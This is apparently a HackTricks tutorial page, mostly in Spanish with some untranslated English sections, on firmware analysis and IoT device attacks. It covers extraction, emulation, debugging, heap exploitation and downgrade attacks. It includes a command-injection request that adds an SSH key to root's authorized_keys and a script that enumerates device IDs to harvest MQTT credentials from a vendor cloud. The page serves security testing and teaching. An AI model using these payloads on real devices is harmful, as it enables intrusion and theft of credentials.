# Análisis de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introducción**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es software esencial que permite que los dispositivos funcionen correctamente al gestionar y facilitar la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que garantiza que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, lo que conduce al inicio del sistema operativo. Examinar y potencialmente modificar el firmware es un paso crítico para identificar vulnerabilidades de seguridad.

## **Recopilación de información**

La **recopilación de información** es un paso inicial crítico para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Detalles del bootloader
- La disposición del hardware y las datasheets
- Métricas de la codebase y ubicaciones del source
- Bibliotecas externas y tipos de licencia
- Historiales de actualizaciones y certificaciones regulatorias
- Diagramas arquitectónicos y de flujo
- Evaluaciones de seguridad y vulnerabilidades identificadas

Para este propósito, las herramientas de **open-source intelligence (OSINT)** son invaluables, al igual que el análisis de cualquier componente de software de open-source disponible mediante procesos de revisión manual y automatizada. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuito que puede aprovecharse para encontrar posibles problemas.

## **Adquisición del Firmware**

Obtener el firmware puede abordarse de varias maneras, cada una con su propio nivel de complejidad:

- **Directamente** de la fuente (desarrolladores, fabricantes)
- **Compilándolo** a partir de las instrucciones proporcionadas
- **Descargándolo** desde sitios oficiales de soporte
- Utilizando consultas **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente al **cloud storage**, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** mediante técnicas de man-in-the-middle
- **Extrayéndolo** del dispositivo a través de conexiones como **UART**, **JTAG** o **PICit**
- **Sniffing** de solicitudes de actualización dentro de la comunicación del dispositivo
- Identificando y utilizando puntos finales de actualización **hardcoded**
- **Dumping** desde el bootloader o la red
- **Retirando y leyendo** el chip de almacenamiento, cuando todo lo demás falla, usando las herramientas de hardware adecuadas

### UART-only logs: force a root shell via U-Boot env in flash

Si se ignora UART RX (solo logs), aún puedes forzar un init shell editando el blob del entorno de U-Boot offline:

1. Haz dump de la SPI flash con un clip SOIC-8 + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localiza la partición del env de U-Boot, edita `bootargs` para incluir `init=/bin/sh`, y **recalcula el U-Boot env CRC32** para el blob.
3. Vuelve a flashear solo la partición env y reinicia; debería aparecer una shell en UART.

Esto es útil en dispositivos embedded donde la shell del bootloader está deshabilitada pero la partición env es escribible mediante acceso externo a la flash.

## Análisis del firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Diferentes herramientas que puedes usar para eso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
If you don't find much with those tools check the **entropy** of the image with `binwalk -E <bin>`, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed in some way).

Moreover, you can use these tools to extract **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Getting the Filesystem

With the previous commented tools like `binwalk -ev <bin>` you should have been able to **extract the filesystem**.\
Binwalk usually extracts it inside a **folder named as the filesystem type**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Sometimes, binwalk will **not have the magic byte of the filesystem in its signatures**. In these cases, use binwalk to **find the offset of the filesystem and carve the compressed filesystem** from the binary and **manually extract** the filesystem according to its type using the steps below.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Ejecuta el siguiente **dd command** para extraer el sistema de archivos Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, también se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Los archivos estarán luego en el directorio "`squashfs-root`".

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analizando Firmware

Una vez obtenido el firmware, es esencial diseccionarlo para comprender su estructura y sus posibles vulnerabilidades. Este proceso implica utilizar diversas herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer cadenas, analizar datos binarios y comprender los detalles de la partición y del filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para evaluar el estado de cifrado de la imagen, se comprueba la **entropy** con `binwalk -E <bin>`. Una entropy baja sugiere falta de cifrado, mientras que una entropy alta indica posible cifrado o compression.

Para extraer **embedded files**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspección de archivos.

### Extracting the Filesystem

Usando `binwalk -ev <bin>`, normalmente se puede extraer el filesystem, a menudo en un directorio con el nombre del tipo de filesystem (por ejemplo, squashfs, ubifs). Sin embargo, cuando **binwalk** no logra reconocer el tipo de filesystem debido a la ausencia de magic bytes, es necesaria la extracción manual. Esto implica usar `binwalk` para localizar el offset del filesystem, seguido del comando `dd` para extraer el filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Después, según el tipo de filesystem (por ejemplo, squashfs, cpio, jffs2, ubifs), se usan diferentes comandos para extraer manualmente el contenido.

### Filesystem Analysis

Con el filesystem extraído, comienza la búsqueda de fallos de security. Se presta atención a daemons de red inseguros, credenciales hardcoded, API endpoints, funcionalidades de update server, código sin compilar, scripts de inicio y binarios compilados para análisis offline.

**Key locations** y **items** para inspeccionar incluyen:

- **etc/shadow** y **etc/passwd** para credenciales de usuario
- certificados y claves SSL en **etc/ssl**
- archivos de configuración y scripts para posibles vulnerabilities
- binarios embebidos para análisis adicional
- web servers y binarios comunes de dispositivos IoT

Varias tools ayudan a descubrir información sensible y vulnerabilities dentro del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para búsqueda de información sensible
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análisis completo de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), y [**EMBA**](https://github.com/e-m-b-a/emba) para análisis estático y dinámico

### Security Checks on Compiled Binaries

Tanto el código fuente como los binarios compilados encontrados en el filesystem deben ser examinados cuidadosamente en busca de vulnerabilities. Tools como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios desprotegidos que podrían ser explotados.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Muchos IoT hubs obtienen su configuración por dispositivo desde un cloud endpoint que tiene este aspecto:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis de firmware puedes encontrar que `<token>` se deriva localmente del device ID usando un secreto hardcoded, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) y se representa como hex uppercase

Este diseño permite que cualquiera que conozca un deviceId y la STATIC_KEY reconstruya la URL y extraiga la cloud config, revelando a menudo credenciales MQTT en plaintext y topic prefixes.

Flujo de trabajo práctico:

1) Extraer deviceId de los UART boot logs

- Conecta un adaptador UART de 3.3V (TX/RX/GND) y captura los logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Busca líneas que impriman el patrón de URL de cloud config y la dirección del broker, por ejemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY y el algoritmo del token desde el firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (por ejemplo, MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Recolecta la configuración de cloud y credenciales MQTT

- Compón la URL y extrae JSON con curl; analiza con jq para extraer secretos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuse MQTT en texto plano y ACLs débiles de topics (si están presentes)

- Usa credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivo predecibles (a escala, con autorización)

- Muchos ecosistemas incorporan bytes OUI/producto/tipo del proveedor seguidos de un sufijo secuencial.
- Puedes iterar IDs candidatos, derivar tokens y obtener configs programáticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Obtén siempre autorización explícita antes de intentar enumeración masiva.
- Prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo cuando sea posible.


El proceso de emular firmware permite **dynamic analysis** ya sea del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede encontrar desafíos con dependencias de hardware o arquitectura, pero transferir el root filesystem o binarios específicos a un dispositivo con la misma arquitectura y endianness, como una Raspberry Pi, o a una pre-built virtual machine, puede facilitar pruebas adicionales.

### Emulating Individual Binaries

Para examinar programas individuales, identificar el endianness y la arquitectura de CPU del programa es crucial.

#### Example with MIPS Architecture

Para emular un binario de arquitectura MIPS, se puede usar el comando:
```bash
file ./squashfs-root/bin/busybox
```
Y para instalar las herramientas de emulación necesarias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), se usa `qemu-mips`, y para binarios little-endian, `qemu-mipsel` sería la opción.

#### ARM Architecture Emulation

Para binarios ARM, el proceso es similar, utilizando el emulador `qemu-arm` para la emulación.

### Full System Emulation

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) y otras facilitan la emulación completa de firmware, automatizando el proceso y ayudando en el análisis dinámico.

## Dynamic Analysis in Practice

En esta etapa, se utiliza para el análisis un entorno de dispositivo real o emulado. Es esencial mantener acceso shell al OS y al filesystem. La emulación puede no imitar perfectamente las interacciones de hardware, lo que puede requerir reinicios ocasionales de la emulación. El análisis debe revisar de nuevo el filesystem, explotar webpages y network services expuestos, y explorar vulnerabilidades del bootloader. Las pruebas de integridad del firmware son críticas para identificar posibles vulnerabilidades de backdoor.

## Runtime Analysis Techniques

El análisis en tiempo de ejecución implica interactuar con un proceso o binario en su entorno operativo, usando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embedded sin un debugger completo, **copia un `gdbserver` enlazado estáticamente** al dispositivo y adjúntalo de forma remota:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

En hubs IoT, el stack RF a menudo se divide entre un **radio MCU** y un proceso de userland en Linux. Un workflow útil es mapear la ruta:

1. **RF frame** en el aire
2. **controller-side parser** en el radio MCU
3. **serial/UART text or TLV protocol** reenviado a Linux (por ejemplo `/dev/tty*`)
4. **application dispatcher** en el daemon principal
5. **protocol-specific handler / state machine**

Esta arquitectura crea dos targets de reversing en lugar de uno. Si el controller convierte frames binarios de radio en un protocolo textual como `Group,Command,arg1,arg2,...`, recupera:

- Los **message groups** y tablas de dispatch
- Qué mensajes pueden venir de la **network** frente al controller mismo
- Los campos discriminadores exactos **manufacturer-specific** (por ejemplo Zigbee `manufacturer_code` y `cluster_command` personalizado)
- Qué handlers solo son alcanzables durante fases de **commissioning**, discovery, o firmware/model download

En concreto para Zigbee, captura el tráfico de pairing y comprueba si el target sigue dependiendo de la **Link Key** por defecto `ZigBeeAlliance09`. Si es así, el sniffing del tráfico de commissioning puede exponer la **Network Key**. Los install codes de Zigbee 3.0 reducen esta exposición, así que anota si el dispositivo probado realmente los aplica.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Los comandos Zigbee/ZCL específicos del vendor suelen ser un mejor target que los clusters estandarizados porque alimentan **custom parsing code** y **FSMs** internas con validación menos probada.

Workflow práctico:

- Revierte el command dispatcher hasta encontrar el **vendor-only handler**.
- Recupera las tablas de **FSM state**, **event**, **check**, **action**, y **next-state**.
- Identifica **transitional states** que avanzan automáticamente y ramas de retry/error que eventualmente reinician o liberan estado controlado por el atacante.
- Confirma qué exchanges legítimos del protocolo son necesarios para colocar el daemon en el estado vulnerable, en vez de asumir que el handler bugueado siempre es alcanzable.

Para protocolos sensibles al timing, el replay de paquetes desde un framework Python puede ser demasiado lento. Un enfoque más fiable es emular un dispositivo legítimo en hardware real (por ejemplo un **nRF52840**) con un stack de nivel vendor para poder exponer los **endpoints**, **attributes**, y timing de commissioning correctos.

### Fragmented-download bug class in embedded daemons

Una clase recurrente de bugs de firmware aparece en **fragmented blob/model/configuration downloads**:

1. El **first fragment** (`offset == 0`) guarda `ctx->total_size` y asigna `malloc(total_size)`.
2. Los fragmentos posteriores solo validan los campos **packet-local** controlados por el atacante, como `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar contra el **original allocated size**.

Esto permite a un atacante enviar:

- Un primer fragmento válido con un tamaño total declarado **pequeño** para forzar una pequeña asignación en heap.
- Un fragmento posterior con el **expected offset** pero un `chunk_len` mayor.
- Un tamaño packet-local falseado que satisface las comprobaciones nuevas mientras desborda el buffer originalmente asignado.

Cuando la ruta vulnerable está detrás de lógica de commissioning, la explotación debe incluir suficiente **device emulation** para llevar al target al estado esperado de model-download o blob-download antes de enviar los fragmentos malformados.

### Protocol-driven `free()` triggers

En daemons embebidos, la forma más fácil de disparar explotación de metadata de heap a menudo no es "esperar al cleanup" sino **forzar el error handling del propio protocolo**:

- Envía fragmentos de seguimiento malformados para empujar la FSM a estados de **retry** o **error**.
- Supera el umbral de retries para que el daemon **resets context** y libere el buffer corrompido.
- Usa este `free()` predecible para disparar primitivas del allocator antes de que el proceso crashee por motivos no relacionados.

Esto es especialmente útil contra allocators tipo **musl/uClibc/dlmalloc-like** en embedded Linux, donde corromper metadata de chunks puede convertir la lógica unlink/unbin en una primitive de escritura. Un patrón estable es corromper un **size field** para redirigir el recorrido del allocator hacia **fake chunks staged inside the overflowed buffer**, en lugar de sobrescribir inmediatamente punteros reales de bins y crashear el proceso.

## Binary Exploitation and Proof-of-Concept

Desarrollar un PoC para vulnerabilidades identificadas requiere una comprensión profunda de la arquitectura target y programación en lenguajes de nivel más bajo. Las protecciones de runtime binario en sistemas embebidos son poco frecuentes, pero cuando existen, técnicas como Return Oriented Programming (ROP) pueden ser necesarias.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc usa fastbins similares a glibc. Una asignación grande posterior puede disparar `__malloc_consolidate()`, así que cualquier fake chunk debe sobrevivir las comprobaciones (size razonable, `fd = 0`, y chunks circundantes vistos como "in use").
- **Non-PIE binaries under ASLR:** si ASLR está habilitado pero el binario principal es **non-PIE**, las direcciones `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya se parezca a un header válido de heap chunk para aterrizar una asignación fastbin sobre una **function pointer table**.
- **Parser-stopping NUL:** cuando se parsea JSON, un `\x00` en el payload puede detener el parsing mientras mantiene bytes finales controlados por el atacante para un stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** una ROP chain que llama a `open("/proc/self/mem")`, `lseek()`, y `write()` puede plantar shellcode ejecutable en un mapping conocido y saltar a él.

## Prepared Operating Systems for Firmware Analysis

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para firmware security testing, equipados con las herramientas necesarias.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro pensada para ayudarte a realizar security assessment y penetration testing de dispositivos Internet of Things (IoT). Te ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias cargadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo de embedded security testing basado en Ubuntu 18.04 con herramientas de firmware security testing precargadas.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Incluso cuando un vendor implementa comprobaciones de firma criptográfica para firmware images, la **version rollback (downgrade) protection** a menudo se omite. Cuando el boot- o recovery-loader solo verifica la firma con una public key embebida pero no compara la *version* (o un contador monótono) de la imagen que se va a flashear, un atacante puede instalar legítimamente un **older, vulnerable firmware that still bears a valid signature** y así reintroducir vulnerabilidades parcheadas.

Workflow típico de ataque:

1. **Obtain an older signed image**
* Consíguela desde el portal público de descargas del vendor, CDN o sitio de soporte.
* Extráela de aplicaciones companion para móvil/escritorio (por ejemplo dentro de un Android APK bajo `assets/firmware/`).
* Recupérala de repositorios de terceros como VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** mediante cualquier canal de update expuesto:
* Web UI, API de mobile-app, USB, TFTP, MQTT, etc.
* Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *unauthenticated* que aceptan firmware blobs codificados en Base64, los decodifican server-side y disparan recovery/upgrade.
3. Después del downgrade, explota una vulnerabilidad que fue parcheada en la versión más nueva (por ejemplo un filtro de command-injection que se añadió después).
4. Opcionalmente, vuelve a flashear la última imagen o desactiva updates para evitar detección una vez que se consigue persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
En el firmware vulnerable (degradado), el parámetro `md5` se concatena directamente en un comando de shell sin sanitisation, lo que permite la inyección de comandos arbitrarios (aquí – habilitando acceso root por SSH basado en clave). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrade hace que la corrección sea inútil.

### Extracting Firmware From Mobile Apps

Muchos vendors empaquetan imágenes completas de firmware dentro de sus companion mobile applications para que la app pueda actualizar el dispositivo por Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX bajo rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista de verificación para evaluar la lógica de actualización

* ¿El transporte/autenticación del *update endpoint* está adecuadamente protegido (TLS + authentication)?
* ¿El dispositivo compara **version numbers** o un **monotonic anti-rollback counter** antes de flashear?
* ¿La imagen se verifica dentro de una secure boot chain (por ejemplo, signatures checked by ROM code)?
* ¿El código de userland realiza comprobaciones adicionales de integridad (por ejemplo, allowed partition map, model number)?
* ¿Los flujos de actualización *partial* o *backup* reutilizan la misma lógica de validación?

> 💡  Si falta cualquiera de los anteriores, la plataforma probablemente es vulnerable a rollback attacks.

## firmware vulnerable para practicar

Para practicar descubriendo vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
